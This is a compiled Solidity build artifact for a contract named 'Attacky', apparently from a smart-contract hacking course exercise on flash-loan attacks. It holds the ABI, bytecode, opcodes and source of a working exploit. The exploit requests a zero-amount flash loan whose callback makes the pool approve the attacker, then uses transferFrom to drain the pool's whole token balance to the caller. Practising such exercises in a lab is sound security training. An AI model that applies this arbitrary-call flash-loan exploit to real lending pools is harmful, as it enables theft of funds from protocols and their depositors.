{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_poolAddress",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "flashAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "poolAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "60c06040526040516107f33803806107f3833981016040819052610022916100ce565b600080546001600160a01b0319166001600160a01b038316908117909155608081905260408051637e062a3560e11b8152905163fc0c546a916004808201926020929091908290030181865afa158015610080573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100a491906100ce565b6001600160a01b031660a052506100f2565b6001600160a01b03811681146100cb57600080fd5b50565b6000602082840312156100e057600080fd5b81516100eb816100b6565b9392505050565b60805160a0516106a661014d6000396000818160e201528181610199015281816103130152818161047101526104e301526000818160b50152818161016c01528181610268015281816102e2015261044401526106a66000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631755ff211461003b578063d02315781461006a575b600080fd5b60005461004e906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b610072610074565b005b604080518082018252601581527402837b7b6103130b630b731b2902122a327a9229d1605d1b602082015290516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015261015592917f0000000000000000000000000000000000000000000000000000000000000000909116906370a08231906024015b602060405180830381865afa15801561012c573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610150919061058a565b610520565b6040516370a0823160e01b81526001600160a01b037f00000000000000000000000000000000000000000000000000000000000000008116600483015260009130917f00000000000000000000000000000000000000000000000000000000000000009184918491908416906370a0823190602401602060405180830381865afa1580156101e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061020b919061058a565b6040516001600160a01b039092166024830152604482015260640160408051601f198184030181529181526020820180516001600160e01b031663095ea7b360e01b17905251633e5a95a360e01b81529091506001600160a01b037f00000000000000000000000000000000000000000000000000000000000000001690633e5a95a3906102a39087908790879087906004016105e9565b600060405180830381600087803b1580156102bd57600080fd5b505af11580156102d1573d6000803e3d6000fd5b50506040516370a0823160e01b81527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0381811660048401527f00000000000000000000000000000000000000000000000000000000000000001693506323b872dd925090339084906370a0823190602401602060405180830381865afa158015610367573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061038b919061058a565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303816000875af11580156103df573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104039190610625565b50604080518082018252601481527302837b7b6103130b630b731b29020a32a22a91d160651b602082015290516370a0823160e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000811660048301526104a292917f0000000000000000000000000000000000000000000000000000000000000000909116906370a082319060240161010f565b6040805180820182526012815271020ba3a30b1b5b2b9103130b630b731b29d160751b602082015290516370a0823160e01b815233600482015261051a91907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906370a082319060240161010f565b50505050565b610565828260405160240161053692919061064e565b60408051601f198184030181529190526020810180516001600160e01b0316632d839cb360e21b179052610569565b5050565b80516a636f6e736f6c652e6c6f67602083016000808483855afa5050505050565b60006020828403121561059c57600080fd5b5051919050565b6000815180845260005b818110156105c9576020818501810151868301820152016105ad565b506000602082860101526020601f19601f83011685010191505092915050565b8481526001600160a01b0384811660208301528316604082015260806060820181905260009061061b908301846105a3565b9695505050505050565b60006020828403121561063757600080fd5b8151801515811461064757600080fd5b9392505050565b60408152600061066160408301856105a3565b9050826020830152939250505056fea2646970667358221220c28e4734d5213b2455715f10309c8b01ae23eb927eacf5f1c37a528e49eea04664736f6c63430008130033",
  "bytecodeSha1": "0ecdaa99d734d06e31892226ae5db0c19b667f07",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "Attacky",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1755FF21 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD0231578 EQ PUSH2 0x6A JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x4E SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x72 PUSH2 0x74 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x15 DUP2 MSTORE PUSH21 0x2837B7B6103130B630B731B2902122A327A9229D1 PUSH1 0x5D SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH2 0x155 SWAP3 SWAP2 PUSH32 0x0 SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x12C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x150 SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH2 0x520 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x0 SWAP2 ADDRESS SWAP2 PUSH32 0x0 SWAP2 DUP5 SWAP2 DUP5 SWAP2 SWAP1 DUP5 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x20B SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 DUP2 MSTORE PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x95EA7B3 PUSH1 0xE0 SHL OR SWAP1 MSTORE MLOAD PUSH4 0x3E5A95A3 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 SWAP2 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND SWAP1 PUSH4 0x3E5A95A3 SWAP1 PUSH2 0x2A3 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP8 SWAP1 PUSH1 0x4 ADD PUSH2 0x5E9 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2BD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2D1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 DUP2 AND PUSH1 0x4 DUP5 ADD MSTORE PUSH32 0x0 AND SWAP4 POP PUSH4 0x23B872DD SWAP3 POP SWAP1 CALLER SWAP1 DUP5 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x367 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x38B SWAP2 SWAP1 PUSH2 0x58A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP7 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND PUSH1 0x4 DUP3 ADD MSTORE SWAP3 SWAP1 SWAP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x403 SWAP2 SWAP1 PUSH2 0x625 JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x14 DUP2 MSTORE PUSH20 0x2837B7B6103130B630B731B29020A32A22A91D1 PUSH1 0x65 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH2 0x4A2 SWAP3 SWAP2 PUSH32 0x0 SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x12 DUP2 MSTORE PUSH18 0x20BA3A30B1B5B2B9103130B630B731B29D1 PUSH1 0x75 SHL PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH2 0x51A SWAP2 SWAP1 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH2 0x10F JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x565 DUP3 DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x536 SWAP3 SWAP2 SWAP1 PUSH2 0x64E JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1F NOT DUP2 DUP5 SUB ADD DUP2 MSTORE SWAP2 SWAP1 MSTORE PUSH1 0x20 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0x2D839CB3 PUSH1 0xE2 SHL OR SWAP1 MSTORE PUSH2 0x569 JUMP JUMPDEST POP POP JUMP JUMPDEST DUP1 MLOAD PUSH11 0x636F6E736F6C652E6C6F67 PUSH1 0x20 DUP4 ADD PUSH1 0x0 DUP1 DUP5 DUP4 DUP6 GAS STATICCALL POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x59C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x5C9 JUMPI PUSH1 0x20 DUP2 DUP6 ADD DUP2 ADD MLOAD DUP7 DUP4 ADD DUP3 ADD MSTORE ADD PUSH2 0x5AD JUMP JUMPDEST POP PUSH1 0x0 PUSH1 0x20 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x20 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP5 DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND PUSH1 0x20 DUP4 ADD MSTORE DUP4 AND PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x0 SWAP1 PUSH2 0x61B SWAP1 DUP4 ADD DUP5 PUSH2 0x5A3 JUMP JUMPDEST SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x637 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x647 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x40 DUP2 MSTORE PUSH1 0x0 PUSH2 0x661 PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0x5A3 JUMP JUMPDEST SWAP1 POP DUP3 PUSH1 0x20 DUP4 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC2 DUP15 SELFBALANCE CALLVALUE 0xD5 0x21 EXTCODESIZE 0x24 SSTORE PUSH18 0x5F10309C8B01AE23EB927EACF5F1C37A528E 0x49 0xEE LOG0 CHAINID PUSH5 0x736F6C6343 STOP ADDMOD SGT STOP CALLER ",
  "sha1": "a03cb73f94badcc8721ca5f368dc2994dd80657c",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"./Pool.sol\";\nimport \"hardhat/console.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n/*\n * @title Pool\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract Attacky  {\n\n    using Address for address;\n\n    Pool immutable pool;\n    IERC20 immutable tokenz;\n    address public poolAddress;\n    constructor (address _poolAddress) payable {\n        poolAddress = _poolAddress;\n        pool = Pool(poolAddress);\n        tokenz = IERC20(address(pool.token()));\n    }\n\n    function flashAttack(\n\n    ) external {\n        console.log(\"Pool balance BEFORE: \",tokenz.balanceOf(address(pool)));\n        uint256 amount = 0;\n        address borrower = address(this);\n        address target = address(tokenz);\n        bytes memory data = abi.encodeWithSignature(\"approve(address,uint256)\", address(this), tokenz.balanceOf(address(pool)));\n        pool.requestFlashLoan(amount, borrower, target, data);\n\n        \n        tokenz.transferFrom(address(pool), msg.sender, tokenz.balanceOf(address(pool)));\n        console.log(\"Pool balance AFTER: \",tokenz.balanceOf(address(pool)));\n        //bytes memory data2 = abi.encodeWithSignature(\"transfer(address,uint256)\", address(this), tokenz.balanceOf(address(pool)));\n        //pool.requestFlashLoan(amount, borrower, target, data2);\n        console.log(\"Attacker balance: \",tokenz.balanceOf(msg.sender));\n    }\n\n}\n",
  "sourcePath": "contracts/flash-loan-attacks-1/flashAttack.sol",
  "type": "contract"
}